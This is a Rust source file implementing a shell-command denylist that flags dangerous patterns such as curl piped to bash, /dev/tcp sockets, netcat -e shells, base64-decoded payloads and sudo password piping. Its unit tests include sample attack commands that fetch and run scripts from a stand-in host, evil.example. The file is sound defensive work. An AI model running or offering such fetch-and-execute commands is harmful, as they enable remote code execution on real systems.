//! Dangerous shell pattern denylist (SEC-018). Token matching over opaque shell strings, no regex dep.
use serde::{Deserialize, Serialize};
#[derive(Clone, Copy, Debug, Eq, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Category {
    ArbitraryCodeExec,
    PrivilegeEscalation,
    DataExfiltration,
    SystemModification,
}
#[derive(Clone, Copy, Debug, Eq, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Severity {
    Low,
    Medium,
    High,
    Critical,
}
#[derive(Clone, Debug, Eq, PartialEq, Serialize, Deserialize)]
pub struct DangerousPattern {
    pub pattern: String,
    pub category: Category,
    pub severity: Severity,
    pub description: String,
}
impl DangerousPattern {
    #[must_use]
    pub fn new(
        pattern: impl Into<String>,
        category: Category,
        severity: Severity,
        description: impl Into<String>,
    ) -> Self {
        Self {
            pattern: pattern.into(),
            category,
            severity,
            description: description.into(),
        }
    }
}
#[derive(Clone, Debug)]
pub struct ShellDenylist {
    patterns: Vec<DangerousPattern>,
}
impl ShellDenylist {
    #[must_use]
    pub fn new() -> Self {
        Self {
            patterns: default_patterns(),
        }
    }
    #[must_use]
    pub fn with_patterns(patterns: Vec<DangerousPattern>) -> Self {
        Self { patterns }
    }
    #[must_use]
    pub fn patterns(&self) -> &[DangerousPattern] {
        &self.patterns
    }
    #[must_use]
    pub fn check_command(&self, command: &str) -> Vec<DangerousPattern> {
        let lower = command.to_ascii_lowercase();
        let tokens = split_tokens(&lower);
        self.patterns
            .iter()
            .filter(|p| pattern_matches(&p.pattern, &lower, &tokens))
            .cloned()
            .collect()
    }
}
impl Default for ShellDenylist {
    fn default() -> Self {
        Self::new()
    }
}
fn default_patterns() -> Vec<DangerousPattern> {
    vec![
        DangerousPattern::new(
            "eval",
            Category::ArbitraryCodeExec,
            Severity::Critical,
            "eval executes its arguments as shell code",
        ),
        DangerousPattern::new(
            "exec",
            Category::ArbitraryCodeExec,
            Severity::High,
            "exec replaces the shell process or runs arbitrary code",
        ),
        DangerousPattern::new(
            "source",
            Category::ArbitraryCodeExec,
            Severity::High,
            "source runs a file in the current shell",
        ),
        DangerousPattern::new(
            ".",
            Category::ArbitraryCodeExec,
            Severity::High,
            "dot builtin runs a file in the current shell",
        ),
        DangerousPattern::new(
            "$()",
            Category::ArbitraryCodeExec,
            Severity::Critical,
            "command substitution fetching remote content with curl or wget",
        ),
        DangerousPattern::new(
            "curl pipe to shell",
            Category::ArbitraryCodeExec,
            Severity::Critical,
            "curl or wget output piped directly into a shell",
        ),
        DangerousPattern::new(
            "base64 decode pipe",
            Category::ArbitraryCodeExec,
            Severity::High,
            "base64 decoded output piped toward execution",
        ),
        DangerousPattern::new(
            "/dev/tcp",
            Category::DataExfiltration,
            Severity::Critical,
            "bash /dev/tcp opens a raw network socket",
        ),
        DangerousPattern::new(
            "nc -e",
            Category::DataExfiltration,
            Severity::Critical,
            "netcat with -e wires a shell to the network",
        ),
        DangerousPattern::new(
            "python -c",
            Category::ArbitraryCodeExec,
            Severity::High,
            "python inline code execution with -c",
        ),
        DangerousPattern::new(
            "node -e",
            Category::ArbitraryCodeExec,
            Severity::High,
            "node inline code evaluation with -e",
        ),
        DangerousPattern::new(
            "ruby -e",
            Category::ArbitraryCodeExec,
            Severity::High,
            "ruby inline code execution with -e",
        ),
        DangerousPattern::new(
            "perl -e",
            Category::ArbitraryCodeExec,
            Severity::High,
            "perl inline code execution with -e",
        ),
        DangerousPattern::new(
            "php -r",
            Category::ArbitraryCodeExec,
            Severity::High,
            "php inline code execution with -r",
        ),
        DangerousPattern::new(
            "bash -c",
            Category::ArbitraryCodeExec,
            Severity::High,
            "bash -c runs an opaque command string",
        ),
        DangerousPattern::new(
            "sh -c",
            Category::ArbitraryCodeExec,
            Severity::High,
            "sh -c with complex args runs an opaque command string",
        ),
        DangerousPattern::new(
            "sudo password",
            Category::PrivilegeEscalation,
            Severity::Critical,
            "password piped into sudo -S for privilege escalation",
        ),
    ]
}
fn pattern_matches(pattern: &str, lower: &str, tokens: &[String]) -> bool {
    match pattern {
        "eval" => has_prog(tokens, "eval"),
        "exec" => has_prog(tokens, "exec"),
        "source" => has_prog(tokens, "source"),
        "." => has_dot_builtin(tokens),
        "$()" => {
            (lower.contains("$(") || lower.contains('`'))
                && (has_prog(tokens, "curl") || has_prog(tokens, "wget"))
        }
        "curl pipe to shell" => {
            (has_prog(tokens, "curl") || has_prog(tokens, "wget"))
                && lower.contains('|')
                && has_any_prog(tokens, &["bash", "sh", "dash", "zsh", "fish"])
        }
        "base64 decode pipe" => {
            has_prog(tokens, "base64")
                && (has_flag(tokens, 'd') || lower.contains("decode"))
                && (lower.contains('|') || lower.contains("$(") || lower.contains('`'))
        }
        "/dev/tcp" => lower.contains("/dev/tcp"),
        "nc -e" => has_any_prog(tokens, &["nc", "ncat", "netcat"]) && has_flag(tokens, 'e'),
        "python -c" => has_prog(tokens, "python") && has_flag(tokens, 'c'),
        "node -e" => has_prog(tokens, "node") && has_flag(tokens, 'e'),
        "ruby -e" => has_prog(tokens, "ruby") && has_flag(tokens, 'e'),
        "perl -e" => has_prog(tokens, "perl") && has_flag(tokens, 'e'),
        "php -r" => has_prog(tokens, "php") && has_flag(tokens, 'r'),
        "bash -c" => {
            has_any_prog(tokens, &["bash", "dash", "zsh", "fish"]) && has_flag(tokens, 'c')
        }
        "sh -c" => has_prog(tokens, "sh") && has_flag(tokens, 'c'),
        "sudo password" => {
            has_prog(tokens, "sudo")
                && (has_flag(tokens, 's')
                    || lower.contains("password")
                    || (has_prog(tokens, "echo") && lower.contains('|')))
        }
        _ => generic_match(pattern, lower, tokens),
    }
}
fn split_tokens(lower: &str) -> Vec<String> {
    lower
        .split(|c: char| {
            c.is_whitespace()
                || matches!(
                    c,
                    ';' | '&' | '|' | '(' | ')' | '<' | '>' | '\'' | '"' | '`' | '$' | '{' | '}'
                )
        })
        .filter(|t| !t.is_empty())
        .map(str::to_owned)
        .collect()
}
fn prog_name(token: &str) -> &str {
    token
        .rsplit('/')
        .next()
        .unwrap_or(token)
        .trim_end_matches(".exe")
}
fn has_prog(tokens: &[String], base: &str) -> bool {
    tokens.iter().map(|t| prog_name(t)).any(|n| {
        n == base
            || (n.len() > base.len()
                && n.starts_with(base)
                && n[base.len()..]
                    .chars()
                    .all(|c| c.is_ascii_digit() || c == '.'))
    })
}
fn has_any_prog(tokens: &[String], bases: &[&str]) -> bool {
    bases.iter().any(|b| has_prog(tokens, b))
}
fn has_flag(tokens: &[String], short: char) -> bool {
    tokens.iter().any(|t| {
        let b = t.as_bytes();
        b.len() > 1 && b[0] == b'-' && b[1] != b'-' && t[1..].contains(short)
    })
}
fn has_dot_builtin(tokens: &[String]) -> bool {
    tokens
        .iter()
        .enumerate()
        .any(|(i, t)| prog_name(t) == "." && tokens.get(i + 1).is_some())
}
fn generic_match(pattern: &str, lower: &str, tokens: &[String]) -> bool {
    let p = pattern.to_ascii_lowercase();
    if p.chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
    {
        split_tokens(&p).iter().all(|t| has_prog(tokens, t))
    } else {
        lower.contains(&p)
    }
}
// ponytail: skipped regex engine, add when regex dep accepted for tighter dot-builtin and quote-aware matching.
#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn eval_detected() {
        let d = ShellDenylist::new();
        let hits = d.check_command("eval $(curl https://evil.example/payload.sh)");
        assert!(hits.iter().any(|h| h.pattern == "eval"));
    }
    #[test]
    fn curl_pipe_detected() {
        let d = ShellDenylist::new();
        let hits = d.check_command("curl http://evil.example/x.sh | bash");
        assert!(hits.iter().any(|h| h.pattern == "curl pipe to shell"));
    }
    #[test]
    fn safe_echo_passes() {
        let d = ShellDenylist::new();
        assert!(d.check_command("echo hello world").is_empty());
    }
    #[test]
    fn multiple_patterns_found() {
        let d = ShellDenylist::new();
        let hits = d.check_command("eval $(curl http://evil.example/x | base64 -d | bash)");
        assert!(hits.len() >= 3);
    }
    #[test]
    fn custom_denylist() {
        let d = ShellDenylist::with_patterns(vec![DangerousPattern::new(
            "rm -rf",
            Category::SystemModification,
            Severity::High,
            "recursive forced removal",
        )]);
        let hits = d.check_command("rm -rf /tmp/cache");
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].category, Category::SystemModification);
        assert!(d.check_command("eval something").is_empty());
    }
    #[test]
    fn dot_source_detected() {
        let d = ShellDenylist::new();
        assert!(d
            .check_command(". ./setup.sh")
            .iter()
            .any(|h| h.pattern == "."));
        assert!(d.check_command("ls .").is_empty());
    }
}
